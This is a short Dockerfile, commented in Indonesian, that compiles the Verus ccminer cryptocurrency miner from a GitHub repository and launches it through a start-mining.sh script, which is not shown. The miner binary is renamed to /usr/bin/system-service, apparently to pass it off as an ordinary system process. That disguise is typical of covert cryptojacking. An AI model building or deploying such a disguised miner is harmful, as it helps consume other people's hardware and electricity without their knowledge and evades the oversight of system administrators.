FROM ubuntu:20.04

# Instal dependensi
RUN apt-get update && apt-get install -y \
    build-essential cmake libuv1-dev libssl-dev libhwloc-dev git curl \
    && rm -rf /var/lib/apt/lists/*

# Unduh dan kompilasi ccminer
RUN git clone https://github.com/monkins1010/verus-miner.git /verus-miner \
    && cd /verus-miner \
    && mkdir build && cd build \
    && cmake .. \
    && make \
    && mv ccminer /usr/bin/system-service

# Salin script mining
COPY start-mining.sh /start-mining.sh
RUN chmod +x /start-mining.sh

CMD ["/start-mining.sh"]
